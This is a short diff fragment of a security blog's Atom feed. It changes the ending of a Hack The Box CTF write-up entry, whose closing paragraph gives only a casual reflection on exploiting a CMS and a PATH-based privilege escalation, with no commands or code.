-&lt;p&gt;Writeup was a quick and easy box. The initial exploit for the CMS was really fun to watch run, as others have said it felt like The Matrix. After that, the privilege escalation had me a little stumped until I heard about pyspy, then it was fairly easy since the &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH&lt;/code&gt; variable stuck out like a soar thumb. It was still fun to figure out how to exploit that after discovery though, and getting the root shell was rather satisfying.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="CMS Made Simple" /><summary type="html"></summary></entry></feed>
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="Elasticsearch" /><category term="ELK" /><summary type="html"></summary></entry></feed>
